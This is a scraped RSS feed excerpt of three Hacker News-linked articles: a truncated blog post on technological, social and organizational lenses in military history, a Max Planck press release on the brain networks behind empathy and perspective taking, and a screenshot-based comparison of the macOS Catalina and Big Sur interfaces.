<p>Instead of the ‘great generals’ orientation of ‘drums and trumpets,’ the field has moved in the direction of three major analytical lenses, laid out quite ably by Jeremy Black in “Military Organisations and Military Charge in Historical Perspective” (<em>JMH</em>, 1998). <strong> He sets out the three basic lenses as technological, social and organizational, which speak to both the questions being asked of the historical evidence but also the answers that are likely to be provided</strong>.  I should note that these lenses are mostly (though not entirely) about <em>academic</em> military history; much of the amateur work that is done is still very much ‘drums and trumpets’ (as is the occasional <em>deeply frustrating</em> books from some older historians we need not discuss here), although that is of course not to say that there isn’t good military history being written by amateurs or that all good military history narrowly follows these schools.  <strong>This is a classification system, not a straight-jacket and I am giving it here because it is a useful way to present the complexity and sophistication of the field as it is, rather than how it is imagined by those who do not engage with it.</strong></p>



<p>(I should note that <em>campaign studies</em> have not been entirely abandoned either.  What distinguishes the modern campaign or battle study from the old ‘drums and trumpets’ style is a broader use of historical causality that reaches beyond just upper-level command decisions. <a href="https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/"> Our recent recommendation, <em>Shattered Sword</em></a> is a good example of how what might have been a ‘drums and trumpets’ narrative of admirals and captains can instead be developed, using more sophisticated historical methods, into a much more complete and compelling historical argument about organizations, doctrines, technologies and so on.  And of course campaign histories will never go out of style – they are the essential foundation on which all other kinds of analysis must be laid)</p>



<p><strong>The technological approach is perhaps the least in fashion these days</strong>, but Geoffery Parker’s <em>The Military Revolution</em> (2nd ed. 1996) provides an almost pure example of the lens.  This approach tends to see changing technology – not merely military technologies, but often also civilian technologies – as the main motivator of military change (and also success or failure for states caught in conflict against a technological gradient).  <strong>Consequently, historians with this focus are often asking questions about how technologies developed, why the developed in certain places, and what their impacts were</strong>.  Another good example of the field, for instance, is the debate about the impact of <a href="https://www.amazon.com/gp/product/0700623833/ref=ppx_yo_dt_b_search_asin_title?ie=UTF8&amp;psc=1">rifled muskets</a> in the <a href="https://www.amazon.com/gp/product/171985727X/ref=ppx_yo_dt_b_asin_title_o07_s00?ie=UTF8&amp;psc=1">American Civil War</a>.  While there has been a real drift away from seeing technologies themselves as decisive on their own (and thus a drift away from mostly ‘pure’ technological military history) in recent decades, this sort of history is very often paired with the others, looking at the ways that social structures, organizational structures and technologies interact.</p>



<p><strong>Perhaps the <em>most</em> popular lens for military historians these days is the social one</strong>, which used to go by the “new military history” (<em>decades </em>ago – it was the standard form even back in the 1990s) but <strong>by this point comprises probably the bulk of academic work on military history</strong>.  In its narrow sense, the social perspective of military history seeks to understand the army (or navy or other service branch) as an extension of the society that created it.  We have, you may note,<a href="https://acoup.blog/2020/05/22/collections-the-battle-of-helms-deep-part-iv-men-of-rohan/"> done a bit of that here</a>.  Rather than understanding the army as a pure instrument of a general’s ‘genius’ it imagines it as a <em><strong>socially embedded</strong></em> institution – which is …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2020/11/13/collections-why-military-history/">https://acoup.blog/2020/11/13/collections-why-military-history/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2020/11/13/collections-why-military-history/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25092118</guid>
            <pubDate>Sat, 14 Nov 2020 13:15:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Empathy and perspective taking: How social skills are built]]>
            </title>
            <description>
<![CDATA[
Score 97 | Comments 68 (<a href="https://news.ycombinator.com/item?id=25091765">thread link</a>) | @CapitalistCartr
<br/>
November 14, 2020 | https://www.cbs.mpg.de/empathy-and-perspective-taking-how-social-skills-are-built | <a href="https://web.archive.org/web/*/https://www.cbs.mpg.de/empathy-and-perspective-taking-how-social-skills-are-built">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  
  
  
  

  

  <p>Being able to feel empathy and to take in the other person's perspective – these are two abilities through which we understand what is going on in the other person's mind. Although both terms are in constant circulation, it is still unclear what exactly they describe and constitute. Scientists at the Max Planck Institute for Human Cognitive and Brain Sciences (MPI CBS) in Leipzig, together with colleagues from Oxford University and other institutions, have now developed a model which explains what empathy and perspective taking are made of. They show that it is not one specific skill that enables us to put ourselves in another person's shoes. These skills are made up of many individual factors that vary according to the situation.</p>
  
  
<figure data-description="<p>It is not one specific skill that enables us to put ourselves in another person's shoes. These skills are made up of many individual factors that vary according to the situation.</p>" data-picture="base64;PHBpY3R1cmUgY2xhc3M9IiIgZGF0YS1pZXNyYz0iLzE2MjM1NDMvb3JpZ2luYWwtMTYwNDkyMjk4OS5qcGc/dD1leUozYVdSMGFDSTZNVFF3TUN3aWIySnFYMmxrSWpveE5qSXpOVFF6ZlE9PS0tNzczZmFhYmFiMzI0MjgwOGRiZmY4ZWVhZWJlYzIyNDkwMmI1NzgxYiIgZGF0YS1hbHQ9Im9yaWdpbmFsIiBkYXRhLWNsYXNzPSIiPjxzb3VyY2UgbWVkaWE9IihtYXgtd2lkdGg6IDc2N3B4KSIgc3Jjc2V0PSIvMTYyMzU0My9vcmlnaW5hbC0xNjA0OTIyOTg5LmpwZz90PWV5SjNhV1IwYUNJNk5ERTBMQ0p2WW1wZmFXUWlPakUyTWpNMU5ETjktLTg5MmU3NjM4MmFmNGI3ZjVmNjUxYjM2YzRmYTgzYzk0NGY0NTc1MzggNDE0dywgLzE2MjM1NDMvb3JpZ2luYWwtMTYwNDkyMjk4OS5qcGc/dD1leUozYVdSMGFDSTZNemMxTENKdlltcGZhV1FpT2pFMk1qTTFORE45LS1kMWE2MTQwNWU5NmRjMWIyN2M4ZTY3Nzg3YTJlZjBmOTkzNTIwMDQzIDM3NXcsIC8xNjIzNTQzL29yaWdpbmFsLTE2MDQ5MjI5ODkuanBnP3Q9ZXlKM2FXUjBhQ0k2TXpJd0xDSnZZbXBmYVdRaU9qRTJNak0xTkROOS0tYzM2MmNkOWVhZjQ2OGFiNTFhNzAwM2I3ODEzZDc2ZWYxMTg2YWJkNCAzMjB3LCAvMTYyMzU0My9vcmlnaW5hbC0xNjA0OTIyOTg5LmpwZz90PWV5SjNhV1IwYUNJNk5ERXhMQ0p2WW1wZmFXUWlPakUyTWpNMU5ETjktLWY1NzZkMjg3MmUwZjRjY2E1ZjBhNmE4ZGM4NDllZjAyNWE0MDE3ZjQgNDExdywgLzE2MjM1NDMvb3JpZ2luYWwtMTYwNDkyMjk4OS5qcGc/dD1leUozYVdSMGFDSTZORGd3TENKdlltcGZhV1FpT2pFMk1qTTFORE45LS01MjhmZTU3MWMzNzVkMWQ5Y2JlYzUzMjljZjgyOWFjZDliYjZiNWQzIDQ4MHcsIC8xNjIzNTQzL29yaWdpbmFsLTE2MDQ5MjI5ODkuanBnP3Q9ZXlKM2FXUjBhQ0k2TXpZd0xDSnZZbXBmYVdRaU9qRTJNak0xTkROOS0tNmYyZjJhZDI1MGNiNGUyMjFhYTFkYWQzMTI5YjRjNTQ5MDE2YjlmYyAzNjB3LCAvMTYyMzU0My9vcmlnaW5hbC0xNjA0OTIyOTg5LmpwZz90PWV5SjNhV1IwYUNJNk9ESTRMQ0p2WW1wZmFXUWlPakUyTWpNMU5ETjktLTYxYmRiOWY0ZDIwNDYzZmFkMmZlNjMyY2U2MmJmZDA4ODg5ZmQyMzAgODI4dywgLzE2MjM1NDMvb3JpZ2luYWwtMTYwNDkyMjk4OS5qcGc/dD1leUozYVdSMGFDSTZOelV3TENKdlltcGZhV1FpT2pFMk1qTTFORE45LS03YWE1MjMxYWVmMzUxYmYyNzk5MzE0MjUyZDM3NTkzYThlZmI0ZmNmIDc1MHcsIC8xNjIzNTQzL29yaWdpbmFsLTE2MDQ5MjI5ODkuanBnP3Q9ZXlKM2FXUjBhQ0k2TmpRd0xDSnZZbXBmYVdRaU9qRTJNak0xTkROOS0tMjEwMzU0MmVmNjM1OTA4ZjRhMmJiOGI4MmVmMzgzNmM1MDAxMmQ0NiA2NDB3LCAvMTYyMzU0My9vcmlnaW5hbC0xNjA0OTIyOTg5LmpwZz90PWV5SjNhV1IwYUNJNk9ESXlMQ0p2WW1wZmFXUWlPakUyTWpNMU5ETjktLTM0NGE4NDcyMjg4M2RmOTRkODkyYTVjZmM4ZGI5OWU4MjRjODA5OWMgODIydywgLzE2MjM1NDMvb3JpZ2luYWwtMTYwNDkyMjk4OS5qcGc/dD1leUozYVdSMGFDSTZPVFl3TENKdlltcGZhV1FpT2pFMk1qTTFORE45LS1mNmExOGUxYjk5MTY5NjE2MzQwOTA5ZWMzZGJjZWMzN2RhYTRkZjQ5IDk2MHcsIC8xNjIzNTQzL29yaWdpbmFsLTE2MDQ5MjI5ODkuanBnP3Q9ZXlKM2FXUjBhQ0k2TnpJd0xDSnZZbXBmYVdRaU9qRTJNak0xTkROOS0tOGI1N2MzNGIzNWQ2YmI4MzQ5ZDEzODNhYzEzMWQyZTI2NDY4NDdhNSA3MjB3IiBzaXplcz0iMTAwdnciIC8+PHNvdXJjZSBtZWRpYT0iKG1pbi13aWR0aDogNzY4cHgpIGFuZCAobWF4LXdpZHRoOiA5OTFweCkiIHNyY3NldD0iLzE2MjM1NDMvb3JpZ2luYWwtMTYwNDkyMjk4OS5qcGc/dD1leUozYVdSMGFDSTZPVEF3TENKdlltcGZhV1FpT2pFMk1qTTFORE45LS0zMGU2YjA5NDlhOTU5OGY3MjAwZGE1NzYzZGJiMGUwYjI0MWNjMGQwIDkwMHcsIC8xNjIzNTQzL29yaWdpbmFsLTE2MDQ5MjI5ODkuanBnP3Q9ZXlKM2FXUjBhQ0k2TVRnd01Dd2liMkpxWDJsa0lqb3hOakl6TlRRemZRPT0tLTg4MjdjNTk4YWY2ZDYxYmE0YTU2MTkxYWQ2Zjg2ZDlmYzM0MzhmZTUgMTgwMHciIHNpemVzPSI5MDBweCIgLz48c291cmNlIG1lZGlhPSIobWluLXdpZHRoOiA5OTJweCkgYW5kIChtYXgtd2lkdGg6IDExOTlweCkiIHNyY3NldD0iLzE2MjM1NDMvb3JpZ2luYWwtMTYwNDkyMjk4OS5qcGc/dD1leUozYVdSMGFDSTZNVEl3TUN3aWIySnFYMmxrSWpveE5qSXpOVFF6ZlE9PS0tNTg3NmQ4NjY5MzAzYmJlYjQxMjc5NGU0MTI5ZjkzZTdjYjA3NTYwNiAxMjAwdywgLzE2MjM1NDMvb3JpZ2luYWwtMTYwNDkyMjk4OS5qcGc/dD1leUozYVdSMGFDSTZNalF3TUN3aWIySnFYMmxrSWpveE5qSXpOVFF6ZlE9PS0tYWE2YzNhYWJkMjZjNzI3OGY0OGQyMTMyNjkyMTJkYTFjMWJhNjM4ZSAyNDAwdyIgc2l6ZXM9IjEyMDBweCIgLz48c291cmNlIG1lZGlhPSIobWluLXdpZHRoOiAxMjAwcHgpIiBzcmNzZXQ9Ii8xNjIzNTQzL29yaWdpbmFsLTE2MDQ5MjI5ODkuanBnP3Q9ZXlKM2FXUjBhQ0k2TVRRd01Dd2liMkpxWDJsa0lqb3hOakl6TlRRemZRPT0tLTc3M2ZhYWJhYjMyNDI4MDhkYmZmOGVlYWViZWMyMjQ5MDJiNTc4MWIgMTQwMHcsIC8xNjIzNTQzL29yaWdpbmFsLTE2MDQ5MjI5ODkuanBnP3Q9ZXlKM2FXUjBhQ0k2TWpnd01Dd2liMkpxWDJsa0lqb3hOakl6TlRRemZRPT0tLWM4YzhkNTZmYzRhY2Q4ZmUyNGZkZDcxNjIzM2VkNDBhZmY2ZWNmMWUgMjgwMHciIHNpemVzPSIxNDAwcHgiIC8+PGltZyBjbGFzcz0iIiB0aXRsZT0iSXQgaXMgbm90IG9uZSBzcGVjaWZpYyBza2lsbCB0aGF0IGVuYWJsZXMgdXMgdG8gcHV0IG91cnNlbHZlcyBpbiBhbm90aGVyIHBlcnNvbiYjMzk7cyBzaG9lcy4gVGhlc2Ugc2tpbGxzIGFyZSBtYWRlIHVwIG9mIG1hbnkgaW5kaXZpZHVhbCBmYWN0b3JzIHRoYXQgdmFyeSBhY2NvcmRpbmcgdG8gdGhlIHNpdHVhdGlvbi4iIHNyYz0iLzE2MjM1NDMvb3JpZ2luYWwtMTYwNDkyMjk4OS5qcGc/dD1leUozYVdSMGFDSTZNVFF3TUN3aWIySnFYMmxrSWpveE5qSXpOVFF6ZlE9PS0tNzczZmFhYmFiMzI0MjgwOGRiZmY4ZWVhZWJlYzIyNDkwMmI1NzgxYiIgLz48L3BpY3R1cmU+">
      
    

    
    <figcaption>
        <p>It is not one specific skill that enables us to put ourselves in another person's shoes. These skills are made up of many individual factors that vary according to the situation.</p>
        <p>
           shutterstock
        </p>
    </figcaption>
</figure>



<p>Understanding what other people want, how they feel, and how they see the world is becoming increasingly important in our complex, globalised society. Social skills enable us to make friends and create a network of people who support us. But not everyone finds it easy to interact with other people. One of the main reasons is that two of the most important social skills - empathy, i.e. being able to empathise with the other person's emotions, and the ability to take a perspective, i.e. being able to gain an information by adopting another person’s point of view - are developed to different degrees.</p>
<p>Researchers have long been trying to find out what helps one to understand others. The more you know about these two social skills, the better you can help people to form social relationships. However, it still not exactly clear what empathy and perspective taking are (the latter is also known as “theory of mind“). Being able to read a person's emotions through their eyes, understand a funny story, or interpret the action of another person—in everyday life there are always social situations that require these two important abilities. However, they each require a combination of different individual subordinate skills. If it is necessary to interpret looks and facial expressions in one situation, in another it may be necessary to think along with the cultural background of the narrator or to know his or her current needs.</p>

<figure data-description="Both capabilities, empathy and theory of mind, are processed in the brain by a 'main network' specialised in empathy (red brain areas) or changing perspective (blue brain areas), which is activated in every social situation. But, depending on the situation, it also involves additional networks." data-picture="base64;PHBpY3R1cmUgY2xhc3M9IiIgZGF0YS1pZXNyYz0iLzE2MjM1NzIvb3JpZ2luYWwtMTYwNDkyMjk4OS5qcGc/dD1leUozYVdSMGFDSTZNVFF3TUN3aWIySnFYMmxrSWpveE5qSXpOVGN5ZlE9PS0tY2E1NjU0NWUwNTU4OGFmMTk2NTU4ZWJiYjc4Y2M5Y2Q4M2UzMjRlZCIgZGF0YS1hbHQ9Im9yaWdpbmFsIiBkYXRhLWNsYXNzPSIiPjxzb3VyY2UgbWVkaWE9IihtYXgtd2lkdGg6IDc2N3B4KSIgc3Jjc2V0PSIvMTYyMzU3Mi9vcmlnaW5hbC0xNjA0OTIyOTg5LmpwZz90PWV5SjNhV1IwYUNJNk5ERTBMQ0p2WW1wZmFXUWlPakUyTWpNMU56SjktLWEyMDVmZDhjZmMyMWE4NDdmNGU4ZTllZDRkNDA5ZDM4OWJkYzQ3Y2EgNDE0dywgLzE2MjM1NzIvb3JpZ2luYWwtMTYwNDkyMjk4OS5qcGc/dD1leUozYVdSMGFDSTZNemMxTENKdlltcGZhV1FpT2pFMk1qTTFOeko5LS01MTMwN2M4YjYxY2MzYzYxMjZlOGY4ODNhMGJlNzNkOWIxZjhjZjFjIDM3NXcsIC8xNjIzNTcyL29yaWdpbmFsLTE2MDQ5MjI5ODkuanBnP3Q9ZXlKM2FXUjBhQ0k2TXpJd0xDSnZZbXBmYVdRaU9qRTJNak0xTnpKOS0tNjM2MmEzZDE5MThiNWY2N2M3NGYyNjk4NTI3MGRiYmEyYTliM2U1ZSAzMjB3LCAvMTYyMzU3Mi9vcmlnaW5hbC0xNjA0OTIyOTg5LmpwZz90PWV5SjNhV1IwYUNJNk5ERXhMQ0p2WW1wZmFXUWlPakUyTWpNMU56SjktLWRlMjNhMTFiMjhiYzgwYmM4NjYzN2FhZmU0ZTRkMjkxMTgxZjMxODIgNDExdywgLzE2MjM1NzIvb3JpZ2luYWwtMTYwNDkyMjk4OS5qcGc/dD1leUozYVdSMGFDSTZORGd3TENKdlltcGZhV1FpT2pFMk1qTTFOeko5LS00MjZkODg2MTVkYmY3MzI5YmQ3ZGFlM2RlNTg1MmY2OWUwMTQ5Y2Q3IDQ4MHcsIC8xNjIzNTcyL29yaWdpbmFsLTE2MDQ5MjI5ODkuanBnP3Q9ZXlKM2FXUjBhQ0k2TXpZd0xDSnZZbXBmYVdRaU9qRTJNak0xTnpKOS0tMTg5OTJmMGQwYTkwNWU4MTcwMzBhMDIzOTI5OTU0ZDViY2YzNWRmYSAzNjB3LCAvMTYyMzU3Mi9vcmlnaW5hbC0xNjA0OTIyOTg5LmpwZz90PWV5SjNhV1IwYUNJNk9ESTRMQ0p2WW1wZmFXUWlPakUyTWpNMU56SjktLTM2MWIxMGExMjBhMDRjODI3OWFkM2M3NmUyZWFiNjVjNzY0MWY2ZjYgODI4dywgLzE2MjM1NzIvb3JpZ2luYWwtMTYwNDkyMjk4OS5qcGc/dD1leUozYVdSMGFDSTZOelV3TENKdlltcGZhV1FpT2pFMk1qTTFOeko5LS0wNTI4MjRjM2I0OWUxYzRjMzVlNWIzYTFiZTc4YmE1NjYxYWEzYzBlIDc1MHcsIC8xNjIzNTcyL29yaWdpbmFsLTE2MDQ5MjI5ODkuanBnP3Q9ZXlKM2FXUjBhQ0k2TmpRd0xDSnZZbXBmYVdRaU9qRTJNak0xTnpKOS0tZDZjZjg5Yjg5NjU3YjNhNTkzYWY2ZjJjMDBhNDhmZDQzODQ3NDM2YSA2NDB3LCAvMTYyMzU3Mi9vcmlnaW5hbC0xNjA0OTIyOTg5LmpwZz90PWV5SjNhV1IwYUNJNk9ESXlMQ0p2WW1wZmFXUWlPakUyTWpNMU56SjktLTBhMjgyMmQ5YTA4NTUyODFkZmY4YjZhYjczOWFhODIzOGJlY2MxYzIgODIydywgLzE2MjM1NzIvb3JpZ2luYWwtMTYwNDkyMjk4OS5qcGc/dD1leUozYVdSMGFDSTZPVFl3TENKdlltcGZhV1FpT2pFMk1qTTFOeko5LS1kNzA1NjU2OTE3MTg1M2ZmMmY4MmViNTgzYTgxZjcwMmU4OTRkNzY0IDk2MHcsIC8xNjIzNTcyL29yaWdpbmFsLTE2MDQ5MjI5ODkuanBnP3Q9ZXlKM2FXUjBhQ0k2TnpJd0xDSnZZbXBmYVdRaU9qRTJNak0xTnpKOS0tMDk1NTMxYmUxMGQ5ZDhmZDMyYjc4OTI1MGExY2Q1MjQwOTYzNDkxYSA3MjB3IiBzaXplcz0iMTAwdnciIC8+PHNvdXJjZSBtZWRpYT0iKG1pbi13aWR0aDogNzY4cHgpIGFuZCAobWF4LXdpZHRoOiA5OTFweCkiIHNyY3NldD0iLzE2MjM1NzIvb3JpZ2luYWwtMTYwNDkyMjk4OS5qcGc/dD1leUozYVdSMGFDSTZPVEF3TENKdlltcGZhV1FpT2pFMk1qTTFOeko5LS03MTQ2OWI3Mzk3ODVhYzI4MzRjNDk5NDMwN2M3M2Y4YzA0OTQ0YzlhIDkwMHcsIC8xNjIzNTcyL29yaWdpbmFsLTE2MDQ5MjI5ODkuanBnP3Q9ZXlKM2FXUjBhQ0k2TVRnd01Dd2liMkpxWDJsa0lqb3hOakl6TlRjeWZRPT0tLWU3MTQxZWY0ZWM5NjkxZDczNGNiYTFlODM3MjJmYjNiNmY4YmZlZjcgMTgwMHciIHNpemVzPSI5MDBweCIgLz48c291cmNlIG1lZGlhPSIobWluLXdpZHRoOiA5OTJweCkgYW5kIChtYXgtd2lkdGg6IDExOTlweCkiIHNyY3NldD0iLzE2MjM1NzIvb3JpZ2luYWwtMTYwNDkyMjk4OS5qcGc/dD1leUozYVdSMGFDSTZNVEl3TUN3aWIySnFYMmxrSWpveE5qSXpOVGN5ZlE9PS0tMjUxYTkxMGUyZmU1MTE5ZGFlMzY5ZGM0ZDMzYzZiYzM4YzMwMjdkNSAxMjAwdywgLzE2MjM1NzIvb3JpZ2luYWwtMTYwNDkyMjk4OS5qcGc/dD1leUozYVdSMGFDSTZNalF3TUN3aWIySnFYMmxrSWpveE5qSXpOVGN5ZlE9PS0tNjNkNjk0OWEwMWU2MzJmZDMyZDI4NmMwOGU4YjZjOTQ2N2VlNDZiYiAyNDAwdyIgc2l6ZXM9IjEyMDBweCIgLz48c291cmNlIG1lZGlhPSIobWluLXdpZHRoOiAxMjAwcHgpIiBzcmNzZXQ9Ii8xNjIzNTcyL29yaWdpbmFsLTE2MDQ5MjI5ODkuanBnP3Q9ZXlKM2FXUjBhQ0k2TVRRd01Dd2liMkpxWDJsa0lqb3hOakl6TlRjeWZRPT0tLWNhNTY1NDVlMDU1ODhhZjE5NjU1OGViYmI3OGNjOWNkODNlMzI0ZWQgMTQwMHcsIC8xNjIzNTcyL29yaWdpbmFsLTE2MDQ5MjI5ODkuanBnP3Q9ZXlKM2FXUjBhQ0k2TWpnd01Dd2liMkpxWDJsa0lqb3hOakl6TlRjeWZRPT0tLTI1ZDVmYzc0YjQyYWNjM2QxOTAyYzA1YWY0YmRkNmUzODRhNGVhOGUgMjgwMHciIHNpemVzPSIxNDAwcHgiIC8+PGltZyBjbGFzcz0iIiB0aXRsZT0iQm90aCBjYXBhYmlsaXRpZXMsIGVtcGF0aHkgYW5kIHRoZW9yeSBvZiBtaW5kLCBhcmUgcHJvY2Vzc2VkIGluIHRoZSBicmFpbiBieSBhICYjMzk7bWFpbiBuZXR3b3JrJiMzOTsgc3BlY2lhbGlzZWQgaW4gZW1wYXRoeSAocmVkIGJyYWluIGFyZWFzKSBvciBjaGFuZ2luZyBwZXJzcGVjdGl2ZSAoYmx1ZSBicmFpbiBhcmVhcyksIHdoaWNoIGlzIGFjdGl2YXRlZCBpbiBldmVyeSBzb2NpYWwgc2l0dWF0aW9uLiBCdXQsIGRlcGVuZGluZyBvbiB0aGUgc2l0dWF0aW9uLCBpdCBhbHNvIGludm9sdmVzIGFkZGl0aW9uYWwgbmV0d29ya3MuIiBzcmM9Ii8xNjIzNTcyL29yaWdpbmFsLTE2MDQ5MjI5ODkuanBnP3Q9ZXlKM2FXUjBhQ0k2TVRRd01Dd2liMkpxWDJsa0lqb3hOakl6TlRjeWZRPT0tLWNhNTY1NDVlMDU1ODhhZjE5NjU1OGViYmI3OGNjOWNkODNlMzI0ZWQiIC8+PC9waWN0dXJlPg==">
      
    

    
    <figcaption>
        <p>
          Both capabilities, empathy and theory of mind, are processed in the brain by a 'main network' specialised in empathy (red brain areas) or changing perspective (blue brain areas), which is activated in every social situation. But, depending on the situation, it also involves additional networks.
        </p>
        <p>
           Apa PsycNet
        </p>
    </figcaption>
</figure>


<p>To date, countless studies have been conducted that examine empathy and perspective taking as a whole. However, it has not yet been clarified what constitutes the core of both competencies and where in the brain their bases lie. Philipp Kanske, former MPI CBS research group leader and currently professor at the TU Dresden, together with Matthias Schurz from the Donders Institute in Nijmegen, Netherlands, and an international team of researchers, have now developed a comprehensive explanatory model.</p>
<p>"Both of these abilities are processed in the brain by a 'main network' specialised in empathy or changing perspective, which is activated in every social situation. But, depending on the situation, it also involves additional networks," Kanske explains, referring to the results of the study, which has just been published in the journal&nbsp;<i>Psychological Bulletin</i>. If we read the thoughts and feelings of others, for example, from their eyes, other additional regions are involved than if we deduce them from their actions or from a narrative. "The brain is thus able to react very flexibly to individual requirements."</p>
<p>For empathy, a main network that can recognise acutely significant situations, for example, by processing fear, works together with additional specialised regions, for example, for face or speech recognition. When changing perspective, in turn, the regions that are also used for remembering the past or fantasising about the future, i.e., for thoughts that deal with things that cannot be observed at the moment, are active as the core network. Here too, additional brain regions are switched on in each concrete situation.</p>
<p><strong>Complex social problems require a combination of empathy and perspective taking</strong></p>
<p>Through their analyses, the researchers have also found out that particularly complex social problems require a combination of empathy and a change of perspective. People who are particularly competent socially seem to view the other person in both ways­—­on the basis of feelings and on the basis of thoughts. In their judgement, they then find the right balance between the two.</p>
<p>"Our analysis also shows, however, that a lack of one of the two social skills can also mean that not this skill as a whole is limited. It may be that only a certain factor is affected, such as understanding facial expressions or speech melody," adds Kanske. A single test is therefore not sufficient to certify a person's lack of social skills. Rather, there must be a series of tests to actually assess them as having little empathy, or as being unable to take the other person's point of view.&nbsp;</p>
<p>The scientists have investigated these relationships by means of a large-scale meta-analysis. They identified, on the one hand, commonalities in the MRI pattern of the 188 individual studies examined when the participants used empathy or perspective taking. This allowed the localisation of the core regions in the brain for each of the two social skills. However, results also indicated how the MRI patterns differed depending on the specific task and, therefore, which additional brain regions were used.&nbsp;</p>
  
</div></div>]]>
            </description>
            <link>https://www.cbs.mpg.de/empathy-and-perspective-taking-how-social-skills-are-built</link>
            <guid isPermaLink="false">hacker-news-small-sites-25091765</guid>
            <pubDate>Sat, 14 Nov 2020 11:54:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A visual comparison of macOS Catalina and Big Sur]]>
            </title>
            <description>
<![CDATA[
Score 101 | Comments 127 (<a href="https://news.ycombinator.com/item?id=25091739">thread link</a>) | @Kaibeezy
<br/>
November 14, 2020 | https://www.andrewdenty.com/blog/2020/07/01/a-visual-comparison-of-macos-catalina-and-big-sur.html | <a href="https://web.archive.org/web/*/https://www.andrewdenty.com/blog/2020/07/01/a-visual-comparison-of-macos-catalina-and-big-sur.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting">

<div itemprop="articleBody">
<p><img src="https://www.andrewdenty.com/blog/assets/img/catalina-vs-big-sur.jpg" alt="Catalina vs Big Sur">
This post is an attempt to provide a visual comparison of pretty dramatic UI changes between macOS Catalina and Big Sur.</p>
<p>Why did I end up doing this? Well, this week I installed the developer beta of macOS Big Sur as I was curious what impact the new UI would have on the <a href="https://www.andrewdenty.com/airtame-desktop-app.html">app I currently design</a>. I wanted to make sure my team was ahead of any coming changes as we were burned by changes in last year’s release of Catalina.</p>
<p>I found myself taking lots of screenshots to try and track the changes and thought this might be worth sharing. I decided to carry out a quick catalogue of the UI changes as this may be helpful to other people getting ready for macOS Big Sur.</p>
<p>All of the screenshots below are taken on a default install of macOS and the Catalina version is always on the left. I made a conscious effort not to resize any windows or change any default settings. I haven’t captured everything, but it is a good taste of the changes so far.</p>
<h2 id="first-impressions">First impressions</h2>


<p>At first glance macOS is a lot more colourful with, and the biggest obvious change is the bright, slightly more cartoonish iOS shaped icons. Everything is more rounded and it feels like everything has gotten a little bigger. Could this be the first hint that macOS is preparing for touch support in the future? One interesting tidbit, is that even though the icons are based around the capsule shape, many of them (like Contacts, or Preview) have elements which protrude from them giving an extra feeling of depth.</p>
<h2 id="finder-and-preview">Finder and Preview</h2>
<p>Finder sees some significant changes. Of all the places I think Apple needs to get the new UI spot on, is Finder. Overall the default size of Finder seems to be bigger in macOS Big Sur.</p>


<p>One thing that struck me at this point is that Finder looks a mess with many of the more advanced features enabled. The bottom screenshot shows Finder with a Path Bar, Status Bar and multiple tabs. To me, it seems like the design team have not yet been able to find a way to elegantly integrate these elements into the iOS inspired UI.</p>
<p>One final thing to note is that in Finder the search bar at the top right has been replaced with a search icon that expands when clicked. This change seems a little inconsistent as it’s not made it to Preview. I can guarantee this will result in fewer people discovering Finder’s Spotlight search goodness.</p>
<h2 id="preferences">Preferences</h2>
<p>Preferences sees quite a lot of change in some areas.
The Dock preferences pane has become “Dock and Menu Bar” and now integrates controls for the new macOS control center. It uses a nicely integrated sidebar to manage different categories.</p>
<p>It’s a shame that this sidebar hasn’t yet made it to other parts of the preferences UI with Network and Notifications still using a very old looking sidebar.</p>
<p>One aspect of preferences that has been quite controversial (on Twitter at least) is the new icons. I’m going to hold off judgement for now as they don’t yet look finished. For example, the Notifications icon does not even support retina displays.</p>


<p>You’ll notice that the Startup Disk pane uses apples new dialog (or sheet) UI. This is quite a departure from the existing sheet drop-down - it feels much more iOS-like.</p>
<h2 id="menu-bar-and-notification-center">Menu Bar and Notification Center</h2>
<p>This is one of the areas where macOS has changed the most. It’s also difficult to take decent screenshots of both of these. Control Center looks like it’s been badly photocopied and the Notification Center in Catalina has a bug whereby it renders at double it’s normal width.</p>
<p>What was obvious within a few minutes of use was that the Control Center is a massive improvement on Catalina’s row of scattered Menu bar icons. The updated WiFi menu is also a massive improvement, as the old list could easily be overwhelming with the number of WiFi networks displayed.</p>
<p>I’m less convinced that the Notification Center is easier to use though. Now it has no background, there is less to separate a list of notifications from my messy desktop!</p>
<p>I will try and get better screenshots for this section and update it in the near future.</p>


<h2 id="safari">Safari</h2>





<h2 id="reminders">Reminders</h2>


<h2 id="notes">Notes</h2>
<p>The biggest news in Notes is that after years, the Skeuomorphic paper texture has finally been retired!</p>


<h2 id="photos">Photos</h2>


<h2 id="apple-music-and-podcasts">Apple Music and Podcasts</h2>
<p>Music and Podcasts were brand new last year with the release of Catalina. It’s obvious that the new UI has been planned for a while as Apple Music and Podcasts are mostly indistinguishable from their initial Catalina release. For example both apps already include the new full height sidebar.</p>
<p>For me this illustrates a bigger point that <a href="https://twitter.com/stevesi/status/1275311056672325633" target="_blank">Steven Sinofsky recently made on Twitter</a> - that Apple is executing a meticulous multi-year strategy.</p>


<p>One area where changes are evident are is in preferences windows. Both apps make use of Apple’s new accent colour and new glyph icon library.</p>
<h2 id="other-bundled-apps">Other bundled apps</h2>
<p>It was impossible to go into depth with every single bundled app. On the whole, the updates to Maps, Books and Mail all look solid with extensive use of the new sidebar.</p>


<h2 id="utilities">Utilities</h2>
<p>Both Activity Monitor and Disk Utility have received a new style toolbar. As with Finder, there are no longer any rows meaning all elements are at the same level. On first impressions, I feel this is a little visually confusing and makes it harder to scan. The search field also loses a lot of its contrast.</p>
<p>Unsurprisingly Terminal is almost unchanged.</p>


<h2 id="almost-unchanged">Almost unchanged</h2>
<p>On the subject of unchanged apps, there were a number of other apps that are so far relatively unchanged.</p>
<p>Siri in macOS Big Sur shows no apparent changes. I think this is a little strange considering the overhaul Siri is receiving in iOS 14. There don’t even seem to be any radius changes to the borders.</p>
<p>The most extreme case of no change is Stickies. It’s completely identical between both releases. What’s more, I don’t think it’s changed much since MacOS 9 judging from its weird, retro controls.</p>


<p>Boot Camp is also practically unchanged, although this is perhaps unsurprising given Apple’s move to Apple Silicon, so presumably Boot Camp’s days are numbered. It did receive a new icon though.</p>
